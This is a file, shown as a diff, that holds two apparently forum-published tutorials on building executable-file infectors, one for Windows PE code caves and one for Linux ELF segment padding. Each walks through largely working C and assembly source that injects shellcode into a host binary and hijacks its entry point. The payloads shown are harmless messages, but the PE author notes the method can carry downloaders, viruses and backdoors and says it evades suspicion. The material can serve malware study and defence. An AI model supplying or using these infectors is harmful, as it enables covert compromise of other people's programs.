@@ -1,0 +1,608 @@
+PE:
+
+The following paper documents a possible PE file infection technique which covers a high level overview and the low level code of how both the infection and the resulting payload is executed. Please note that some of the following material may not be suited for beginners as it requires:
+
+Proficiency in C/C++
+Proficiency in Intel x86 assembly
+Knowledge of the WinAPI and its documentation
+Knowledge of the PE file structure
+Knowledge of Dynamic Linked Libraries
+Disclaimer: This paper is written within the scope of my own self research and study of malware and Windows internals and I apologize in advance for any incorrect information. If there is any feedback, please leave a reply or private message me.
+
+Infection Technique
+The method with which we will be covering consists of taking advantage of the implementation of the PE file structure. Code caves are essentially blocks of empty spaces (or null bytes) which are a result of file alignment of the corresponding section’s data. Because these holes exist, it is entirely possible to place our own data inside with little or nothing preventing us. Here is and example of a code cave in our target application (putty.exe).
+
+
+
+For more information on code caves, please see CodeProject - The Beginner’s Guide to Codecaves 520.
+
+For our approach, we will be targeting the last section of the executable, injecting our own code inside for execution before jumping back to the original code. Here is a visual representation:
+
+                Target program's structure
+                     after infection
+
+                    +----------------+
+                    |     Header     |
+    Original -----> +----------------+ <---+  Return to 
+    start           |     .text      |     |  original start
+                    +----------------+     |  after shellcode
+                    |     .rdata     |     |  finishes execution
+                    +----------------+     |
+                    |       ...      |     |
+                    +----------------+     |
+                    |      .tls      |     |
+    New start ----> +-   -   -   -   + ----+
+                    |    shellcode   |
+                    +----------------+
+                         ^   ^   ^
+                Injected shellcode goes here
+                  inside the .tls section
+As a result of this infection method, the program will remain intact and since we will be injecting the shellcode inside an existing empty region of the file, the file size will not change and will hence reduce suspicion which is essential for malware survival.
+
+Coding the Infector
+The infector will be responsible for modifying a target application by injecting the shellcode into the last section. Here is the pseudocode:
+
+Infector Pseudocode
+1. Open file to read and write
+2. Extract PE file information
+3. Find a suitably-sized code cave
+4. Tailor shellcode to the target application
+5. Acquire any additional data for the shellcode to function
+6. Inject the shellcode into the application
+7. Modify the application's original entry point to the start of the shellcode
+Let’s now see how we could implement this in code.
+
+Note: For the sake of cleanliness and readability, I will not be including error checks.
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <TARGET FILE>\n", argv[0]);
+        return 1;
+    }
+
+    HANDLE hFile = CreateFile(argv[1], FILE_READ_ACCESS | FILE_WRITE_ACCESS, 
+                        0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+    DWORD dwFileSize = GetFileSize(hFile, NULL);
+
+    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
+
+    LPBYTE lpFile = (LPBYTE)MapViewOfFile(hMapping, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, dwFileSize);
+
+}
+We’ll be designing our program to take in a target file from the command line.
+
+First of all, we need to get a handle to a file using the CreateFile function with the read and write access permissions so that we are able to read data from and write data to the file. We’ll also need to get the size of the file for the following task.
+
+The CreateFileMapping function creates a handle to the mapping. We specify a read and write permission (same as CreateFile) and also the maximum size we want the mapping to be, i.e. the size of the file.After obtaining the handle to the file mapping, we can create the mapping itself. The MapViewOfFile function maps the file into our memory space and returns a pointer to the start of the mapped file, i.e. the beginning of the file. Here we cast the return value as a pointer to an byte which is the same as an unsigned char value.
+
+In this next section, we require that the target file be a legitimate PE file so we need to verify the MZ and the PE\0\0 signatures. I’ve done this with a separate function in a different file which I will show at the end of the article.
+
+int main(int argc, char *argv[]) {
+    ...
+
+    // check if valid pe file
+    if (VerifyDOS(GetDosHeader(lpFile)) == FALSE ||
+        VerifyPE(GetPeHeader(lpFile)) == FALSE) {
+        fprintf(stderr, "Not a valid PE file\n");
+        return 1;
+    }
+
+    PIMAGE_NT_HEADERS pinh = GetPeHeader(lpFile);
+    PIMAGE_SECTION_HEADER pish = GetLastSectionHeader(lpFile);
+
+    // get original entry point
+    DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint + 
+                    pinh->OptionalHeader.ImageBase;
+
+    DWORD dwShellcodeSize = (DWORD)ShellcodeEnd - (DWORD)ShellcodeStart;
+
+}
+Once we’ve verified and the target file is suitable for infection, we need to obtain the original entry point (OEP) so that we can jump back to it after our shellcode finished execution. Here, we also calculate the size of the shellcode by subtracting the end of the shellcode from the beginning. I will show what these functions look like later on and it will make much more sense.
+
+Next, we’ll need to find an appropriate-sized code cave.
+
+int main(int argc, char *argv[]) {
+    ...
+
+    // find code cave
+    DWORD dwCount = 0;
+    DWORD dwPosition = 0;
+
+    for (dwPosition = pish->PointerToRawData; dwPosition < dwFileSize; dwPosition++) {
+        if (*(lpFile + dwPosition) == 0x00) {
+            if (dwCount++ == dwShellcodeSize) {
+                // backtrack to the beginning of the code cave
+                dwPosition -= dwShellcodeSize;
+                break;
+            }
+        } else {
+            // reset counter if failed to find large enough cave
+            dwCount = 0;
+        }
+    }
+
+    // if failed to find suitable code cave
+    if (dwCount == 0 || dwPosition == 0) {
+        return 1;
+    }
+
+}
+We obtained pish from the previous code section which is a pointer to the last section’s header. Using the header information, we can calculate the starting position dwPosition which points to the beginning of the code in that section and we’ll read to the end of the file using the size of the file dwFileSize as a stopping condition.
+
+What we do is we create a loop from the beginning of the section to the end of the section (end of the file) and every time we come across a null byte, we will increment the dwCount variable, otherwise, we’ll reset the value if there is a byte which is not a null byte. If the dwCount reaches the size of the shellcode, we will have found a code cave which can house it. We’ll then need to subtract the dwPosition with the size of the shellcode since we need the offset position of the beginning of the code cave so we know where to write to it later.If, for some reason, we are unable to find a code cave, the dwCount should be of size 0 and if the loop fails to start, dwPosition will also be 0. I’m not really sure if these conditions are necessary so but I have them there just in case.
+
+In this example, the target application will spawn a message box before it runs itself normally.
+
+int main(int argc, char *argv[]) {
+    ...
+
+    // dynamically obtain address of function
+    HMODULE hModule = LoadLibrary("user32.dll");
+
+    LPVOID lpAddress = GetProcAddress(hModule, "MessageBoxA");
+
+    // create buffer for shellcode
+    HANDLE hHeap = HeapCreate(0, 0, dwShellcodeSize);
+
+    LPVOID lpHeap = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwShellcodeSize);
+
+    // move shellcode to buffer to modify
+    memcpy(lpHeap, ShellcodeStart, dwShellcodeSize);
+
+}
+Because of this, we will need the address of the function MessageBoxA which is found in the User32 DLL. First, we’ll need a handle to the User32 DLL which is done by using the LoadLibrary function. We’ll then use the handle with GetProcAddress to retrieve the address of the function. Once we have this, we can copy the address into the shellcode so it can call the MessageBoxA function.
+
+Next, we’ll need to dynamically allocate a buffer to store the shellcode itself so that we can modify the placeholder values in the shellcode function with the correct ones, i.e. the OEP and the MessageBoxA address.
+
+int main(int argc, char *argv[]) {
+    ...
+
+    // modify function address offset
+    DWORD dwIncrementor = 0;
+    for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
+        if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
+            // insert function's address
+            *((LPDWORD)lpHeap + dwIncrementor) = (DWORD)lpAddress;
+            FreeLibrary(hModule);
+            break;
+        }
+    }
+
+    // modify OEP address offset
+    for (; dwIncrementor < dwShellcodeSize; dwIncrementor++) {
+        if (*((LPDWORD)lpHeap + dwIncrementor) == 0xAAAAAAAA) {
+            // insert OEP
+            *((LPDWORD)lpHeap + dwIncrementor) = dwOEP;
+            break;
+        }
+    }
+
+}
+In these two for loops, we attempt to locate the placeholders (0xAAAAAAAA) in the shellcode and replace them with the values we need. What they do is they’ll go through the shellcode buffer and if it finds a placeholder, it will overwrite it. These loops cannot be swapped and must maintain this order and we will see why when we have a look at the shellcode function later.
+
+int main(int argc, char *argv[]) {
+    ...
+
+    // copy the shellcode into code cave
+    memcpy((LPBYTE)(lpFile + dwPosition), lpHeap, dwShellcodeSize);
+    HeapFree(hHeap, 0, lpHeap);
+    HeapDestroy(hHeap);
+
+    // update PE file information
+    pish->Misc.VirtualSize += dwShellcodeSize;
+    // make section executable
+    pish->Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
+    // set entry point
+    // RVA = file offset + virtual offset - raw offset
+    pinh->OptionalHeader.AddressOfEntryPoint = dwPosition + pish->VirtualAddress - pish->PointerToRawData;
+
+    return 0;
+}
+Now that the shellcode is complete, we can inject it into the mapped file using a memcpy. Remember that we saved the offset of the code cave with dwPosition; we use it here to calculate it from the beginning of the file which is where lpFile points to. We simply copy the shellcode buffer with the size of the shellcode.
+
+We need to update some of the values inside the headers. The section header’s VirtualSize member needs to be changed to include the size of the shellcode. We also want the section to be executable so that the shellcode can do its thing. Finally, the AddressOfEntryPoint needs to be pointed to the start of the code cave where the shellcode is hiding.
+
+Now, let’s take a look at the shellcode functions.
+
+#define db(x) __asm _emit x
+
+__declspec(naked) ShellcodeStart(VOID) {
+    __asm {
+            pushad
+            call    routine
+
+        routine:
+            pop     ebp
+            sub     ebp, offset routine
+            push    0                                // MB_OK
+            lea     eax, [ebp + szCaption]
+            push    eax                              // lpCaption
+            lea     eax, [ebp + szText]
+            push    eax                              // lpText
+            push    0                                // hWnd
+            mov     eax, 0xAAAAAAAA
+            call    eax                              // MessageBoxA
+
+            popad
+            push    0xAAAAAAAA                       // OEP
+            ret
+
+        szCaption:
+            db('d') db('T') db('m') db(' ') db('W') db('u') db('Z') db(' ')
+            db('h') db('3') db('r') db('e') db(0)
+        szText :
+            db('H') db('a') db('X') db('X') db('0') db('r') db('3') db('d')
+            db(' ') db('b') db('y') db(' ') db('d') db('T') db('m') db(0)
+    }
+}
+
+VOID ShellcodeEnd() {
+
+}
+There are two functions here: ShellcodeStart and ShellcodeEnd. From before, we calculated the size of the shellcode by subtracting the ShellcodeStart's function address from the ShellcodeEnd's function address. The ShellcodeEnd function’s only purpose is to signify the end of the shellcode.
+
+The declaration of the ShellcodeStart function uses __declspec(naked) since we do not want any prologues or epilogues in our function. We want it as clean as possible.
+
+The shellcode starts with a pushad which is an instruction to push all of the registers onto the stack and we need to do this to preserve the process’s context that’s set up for the program to run. Once that’s been handled, we can then execute our routine.
+
+Since this shellcode will be in the memory of another program, we cannot control where the address of values will be and so we will need to use some tricks to dynamically calculate the addresses.
+What we do here is use a technique called a delta offset. What happens is that when routine is called, it immediately pops the return address (which is the address of routine) into the base pointer register. We then subtract the base pointer register’s value with the address of routine and that ultimately results in 0. We can then calculate the address of the string variables szCaption and szText by simply adding their addresses onto the base pointer register and in this case, it’s simply their addresses. We then push the parameters of MessageBoxA onto the stack and then call the function.
+
+After the routine has finished and done what we wanted, we then recover the register values with popad, push the address of OEP and return, effectively jumping back to the original entry point so the program can run normally.
+
+This is what the resulting infected application should look like.
+
+
+A Quick Demonstration
+Here is what happens when the infected putty.exe is launched.
+
+
+And then…
+
+
+Conclusion
+The message box dialog is only an example. The potential of the payload is far greater than what has been documented here ranging from downloaders to viruses to backdoors where the only limit (for this specific technique) is the number of available code caves. This example only utilizes one of the many existing ones where more complex implementations can weave and integrate entire applications throughout code caves throughout all sections.
+
+This article has been made possible thanks to rohitab.com - Detailed Guide to Pe Infection 540 with which I used to research and reference. It’s not entirely the same, I made some changes here and there depending on my needs.
+
+Thanks for reading.
+
+– dtm
+
+Appendix
+PIMAGE_DOS_HEADER GetDosHeader(LPBYTE file) {
+    return (PIMAGE_DOS_HEADER)file;
+}
+
+/*
+* returns the PE header
+*/
+PIMAGE_NT_HEADERS GetPeHeader(LPBYTE file) {
+    PIMAGE_DOS_HEADER pidh = GetDosHeader(file);
+
+    return (PIMAGE_NT_HEADERS)((DWORD)pidh + pidh->e_lfanew);
+}
+
+/*
+* returns the file header
+*/
+PIMAGE_FILE_HEADER GetFileHeader(LPBYTE file) {
+    PIMAGE_NT_HEADERS pinh = GetPeHeader(file);
+
+    return (PIMAGE_FILE_HEADER)&pinh->FileHeader;
+}
+
+ELF:
+
+As it doesn’t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great PE File Infector 118 paper from @dtm but targeting ELF 51 binaries specifically under GNU/Linux systems.
+
+The process I will describe is slightly different from the one explained in the PE counterpart, so you will get a different view of the process and hopefully that will help you to better understand how do these things work. Moreover, it does not feel right to just write the same thing even if it is targeting to a different system.
+
+So, let’s start.
+
+Infection Technique
+If you had read the “PE File Infector” paper in this site, you should already know what a code cave is. If you do not know that, go and read it, right now.
+
+In the Linux world, you will find references to this technique as Segment padding infection. It is basically the same thing, I’m saing just in case you want to look for further information.
+
+The infection technique we are going to implement is as follow:
+
+Find the padding area between the .text segment and the next segment in the program (that is usually .data).
+Append the payload code to the end of the .text segment (in that padding area)
+Patch the ELF binary to run the injected coded at start up (modify the ELF entry point)
+Patch the payload to return execution to the original ELF entry point
+The technique takes advantage of the padding areas in the segments. This, basically happen because the operating system works with a Page granularity. It is related to the processor memory management unit, but that is a bit out of scope. So, in general, there is an unused area at the end of the .text segment. The size of that area depends on the size of the code, and may even not exist or just be a couple of bytes. For that reason, this technique may not work with some programs.
+
+The main advantage of this technique is that the file size and the overall ELF data structures are not modified at all (with the exception of the application entry point).
+
+Writing an Infector
+The ELF code injector is pretty straightforward. The main function is a bit long, so I will divide it in smaller functional blocks in the hope that it will be easier to follow.
+
+You can find the whole source code at github.
+
+
+GitHub
+
+0x00pf/0x00sec_code 475
+Code for my 0x00sec.org posts. Contribute to 0x00pf/0x00sec_code development by creating an account on GitHub.
+
+Opening the target ELF File
+The first thing the main function does (after a quick check of the number of parameters) is to open the target ELF File. The code looks like this:
+
+int
+main (int argc, char *argv[])
+{
+  void        *d, *d1;
+  int         target_fd, payload_fd;
+  int         fsize, fsize1;
+
+  printf ("Segment Padding Infector for 0x00sec\nby pico\n\n");
+  if (argc != 3)
+    {
+      fprintf (stderr, "Usage:\n  %s elf_file payload\n", argv[0]);
+      exit (1);
+    }
+
+  /* Open and map target ELF and payload */
+  target_fd  = elfi_open_and_map (argv[1], &d, &fsize);
+  payload_fd = elfi_open_and_map (argv[2], &d1, &fsize1);
+OK, there is not much to say about this, the main function opens and maps the target ELF to inject our code into and the code to be injected… let’s continue looking into the elfi_open_and_map function:
+
+int
+elfi_open_and_map (char *fname, void **data, int *len)
+{
+  int   size;
+  int   fd;
+  
+  if ((fd = open (fname, O_APPEND | O_RDWR, 0)) < 0)
+    {
+      perror ("open:");
+      exit (1);
+    }
+  
+  size = get_file_size (fd);
+  if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC,
+		    MAP_SHARED, fd, 0)) == MAP_FAILED)
+    {
+      perror ("mmap:");
+      exit (1);
+    }
+  
+  printf ("+ File mapped (%d bytes ) at %p\n", size, data);
+  *len = size;
+  return fd;
+}
+This function does three things:
+
+It open the file using open
+Then it uses a utility function called get_file_size to find out the size of the file. We need this information for the last step. The get_file_size function just calls fstab (I will not include it here as it is not really interesting)
+It memory maps the file. This means that we can access the file as if it were in memory (using pointers), but we are actually modifying the file in disk. So, this is a very convenient way of patching a file
+The function returns the file descriptor and uses to output parameters to return the pointer to the memory mapped area (that is the beginning of our file) and its size.
+
+Getting information
+Now that we have access to our files, we will store some information:
+
+  /* Get Application Entry point */
+  elf_hdr = (Elf64_Ehdr *) d;
+  ep = elf_hdr->e_entry;
+  printf ("+ Target Entry point: %p\n", (void*) ep);
+As we said, the pointer returned by elfi_open_and_map points to the actual content of the file. For an ELF file, the first thing we find is the ELF header. Take a look to the specs 43 to find out the information kept by this structure.
+
+Right now, we are interested in the application entry point. That is the address where program will start its execution. Think about it as the memory address for the main function… It is not that easy, but for our current discussion such a definition should be OK.
+
+Finding a gap
+Now we have to find a gap in the target file. We had wrote a function to do that, which we call from the main function:
+
+ Elf64_Phdr  *t_text_seg = elfi_find_gap (d, fsize, &p, &len);
+ Elf64_Addr  *base = t_text_seg->p_vaddr;
+The elfi_find_gap function will go through all the ELF segments and try to find the gap in the one that holds the code. It returns a pointer to the ELF segment structure that we will use later. It also returns the offset in the file to the gap and its size, using a couple of output parameters
+
+After finding the code segment, we will also store the memory address where that code will be loaded. This is usually 0x400000, but it may be different on some applications.
+
+The elfi_find_gap function looks like this:
+
+Elf64_Phdr*
+elfi_find_gap (void *d, int fsize, int *p, int *len)
+{
+  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
+  Elf64_Phdr* elf_seg, *text_seg;
+  int         n_seg = elf_hdr->e_phnum;
+  int         i;
+  int         text_end, gap=fsize;
+
+  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
+			    + (unsigned int) elf_hdr->e_phoff);
+
+  for (i = 0; i < n_seg; i++)
+    {
+      if (elf_seg->p_type == PT_LOAD && elf_seg->p_flags & 0x011)
+	{
+	  printf ("+ Found .text segment (#%d)\n", i);
+	  text_seg = elf_seg;
+	  text_end = elf_seg->p_offset + elf_seg->p_filesz;
+	}
+      else
+	{
+	  if (elf_seg->p_type == PT_LOAD && 
+	      (elf_seg->p_offset - text_end) < gap) 
+	    {
+	      printf ("   * Found LOAD segment (#%d) close to .text (offset: 0x%x)\n",
+		      i, (unsigned int)elf_seg->p_offset);
+	      gap = elf_seg->p_offset - text_end;
+	    }
+	}
+      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
+			    + (unsigned int) elf_hdr->e_phentsize);
+    }
+
+  *p = text_end;
+  *len = gap;
+
+  printf ("+ .text segment gap at offset 0x%x(0x%x bytes available)\n", text_end, gap);
+
+  return text_seg;
+}
+Once again, we first access the ELF header to figure out where, within the file, the segment information is stored. It actually is at the offset specified by the header’s field e_phoff. With all this information, we can start checking the segments.
+
+First we look for a segment of type PT_LOAD with execution permissions. Normally there is only one, and it is the one containing the .text section, and therefore the application code. When we find it, we store the pointer to the segment structure (to return it later) and the offset to the actual end of the section in the file.
+
+Then we keep looking for PT_LOAD segments and we calculate the gap with respect to the current executable segment we have already found, and we store the one with the smallest gap.
+
+This function probably can be heavily improved. Normally there are only two PT_LOAD segment and they one after the other in the file. I was not sure if it is possible to get those segments out of order in the file (in theory should be possible) so that is why the function is a bit complex.
+
+Oh sure, PT_LOAD segments are those that are directly loaded from the file. Other segments like the ones containing the stack or the .bss section are not stored in the file, but the code and static data have to be there and the PT_LOAD type is the way the system knows that the data in the file has to be loaded in memory.
+
+The Payload
+We have to stop for a sec, looking to our infector code and take a look to the payload we are going to use and how to get it into memory. We had just write a simple payload that prints a message in the console. I know that is not very impressive, but this is already becoming a bit long and complex howto.
+
+So, our payload looks like this:
+
+section .text
+        global _start
+
+_start:
+        mov rax,1       ; [1] - sys_write
+        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
+        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
+        mov rdx, msg_end - msg      ; msg size
+        syscall         ; calls the function stored in rax
+
+	mov rax, 0x11111111
+	jmp rax
+
+align 8
+        msg     db 'This file has been infected for 0x00SEC',0x0a,0
+	msg_end db 0x0
+It is the classical Hello World assembler program, but, just after printing the message, it will jump back to somewhere. The 0x11111111 is a mark where we will have to write the original ELF access point, to let the original application run normally.
+
+As usual, we can compile this small program with:
+
+nasm -f elf64 -o payload.o payload.asm;ld -o payload payload.o
+And we are done to get back to our ELF injector.
+
+Processing the payload
+You could just use some external tool to produce an hex dump of the payload code. Check @unh0lys0da shellcode tutorial 17 for details. In this case, as we are playing with the ELF format, we are going to directly use the binary produced by nasm.
+
+The way we used to compile our payload, was actually producing a ELF file. If you recall the beginning of the paper we had already opened the payload and mapped it on memory. Now we just need to find out where the actual code is, and copy it in the .text segment gap of the target program we have found before.
+
+This is what the code below does:
+
+  Elf63_Shdr *p_text_sec = elfi_find_section (d1, ".text");
+
+  printf ("+ Payload .text section found at %lx (%lx bytes)\n", 
+	  p_text_sec->sh_offset, p_text_sec->sh_size);
+
+  if (p_text_sec->sh_size > len)
+    {
+      fprintf (stderr, "- Payload to big, cannot infect file.\n");
+      exit (1);
+    }
+  /* Copy payload in the segment padding area */
+  memmove (d + p, d1 + p_text_sec->sh_offset, p_text_sec->sh_size);
+
+First we call a function (that we will describe in a sec) to find out where the .text section is, and therefore where the payload code is. The function returns a pointer to an ELF section structure that contains all the information we need.
+
+Then we have to check if the size of the .text section of the payload (our code) fits in the gap we had previously found, and finally we just copy the payload code into the target file just at the end of the executable segment. Using the pointer returned by elfi_find_gap.
+
+Finding a Section in an ELF File
+So, we have to take a look to the elfi_find_section function. Here it is
+
+Elf64_Shdr *
+elfi_find_section (void *data, char *name)
+{
+  char        *sname;
+  int         i;
+  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
+  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr->e_shoff);
+  Elf64_Shdr *sh_strtab = &shdr[elf_hdr->e_shstrndx];
+  const char *const sh_strtab_p = data + sh_strtab->sh_offset;
+   
+  printf ("+ %d section in file. Looking for section '%s'\n", 
+	  elf_hdr->e_shnum, name);
+  
+  
+  for (i = 0; i < elf_hdr->e_shnum; i++)
+    {
+      sname = (char*) (sh_strtab_p + shdr[i].sh_name);
+      if (!strcmp (sname, name))  return &shdr[i];
+    }
+  
+  return NULL;
+}
+
+In order to find a section by name, we have to access to the symbol table in the ELF file. That table stores all the symbols required by the executable. Section names, external libraries, relocation symbols names,… Everything that is a human readable string.
+
+The section list in the ELF file stores the section name as an index in the symbol table. So, despite of all that pointer gymnastics, the function is just looping through the section list, retrieving the name using the information there, and comparing that string with the passed parameter.
+
+Just open the ELF spec, and start following the data structures. It’s just tedious but not difficult.
+
+Patching Entry Points
+So, we are almost done. Now we just need to patch the entry points. This is done with the following code in the main function:
+
+  /* Patch return address */
+  elfi_mem_subst (d+p, p_text_sec->sh_size, 0x11111111, (long)ep);
+
+  /* Patch entry point */
+  elf_hdr->e_entry = (Elf64_Addr) (base + p);
+
+  /* Close files and actually update target file */
+  close (payload_fd);
+  close (target_fd);
+
+The elfi_mem_subst function just looks for the sequence 0x11111111 (do you remember it in our payload?), and substitutes it with the original ELF entry point. This will start the target application just after running our payload.
+
+Then, for the main entry point, we just use our ELF Header pointer and write there the address for our payload, so it gets executed when the application is executed. We calculate the payload address as the base address we have got from the execution segment plus the offset to the segment gap we found at the beginning.
+
+Once we are done, we just close the files to make sure that all the changes we made in the memory mapped area, make it to the file.
+
+Just for completeness, let’s take a look to elfi_mem_subtr:
+
+int
+elfi_mem_subst (void *m, int len, long pat, long val)
+{
+  unsigned char *p = (unsigned char*)m;
+  long v;
+  int i, r;
+
+  for (i = 0; i < len; i++)
+    {
+      v = *((long*)(p+i));
+      r = v ^pat;
+
+      if (r ==0) 
+	{
+	  printf ("+ Pattern %lx found at offset %d -> %lx\n", pat, i, val);
+	  *((long*)(p+i)) = val;
+	  return 0;
+	}
+    }
+  return -1;
+}
+
+Nothing special, we just scan the payload byte by byte to find our mark. When found, it is substituted by the value passed as a parameter (in this case the original entry point).
+
+Using the injector
+So, compile the application and generate your payload
+
+$ make elf_injector
+$ nasm -f elf64 -o payload.o payload.asm;ld -o payload payload.o
+An then just start injecting your payload:
+
+$ ./elf_inject xeyes payload
+I had tried the program with some binaries in my system. I have to say that it had failed with some, and I do not know yet the reason. Some of the ones I successfully used were: xeyes, vim, lynx…
+
+It failed with evince, for instance… So, lucky you, it is not perfect, and you have something to look at and play with :)… Have ELFun!
+
+Final Words
+If you are planning to look further into this topic (you should, it is really interesting), it would be a good idea to install the readelf for easily inspect your ELF files.
+
+Also make sure that xxd is available to do hex dump and check that you are dumping data in the right place.
+
+I have wrote this pretty quickly so it may not be the most comprehensive howto and some parts may be hard to follow. Let me know in the comments if something needs improvement
+
+Happy Hacking!
+pico
+
+
+
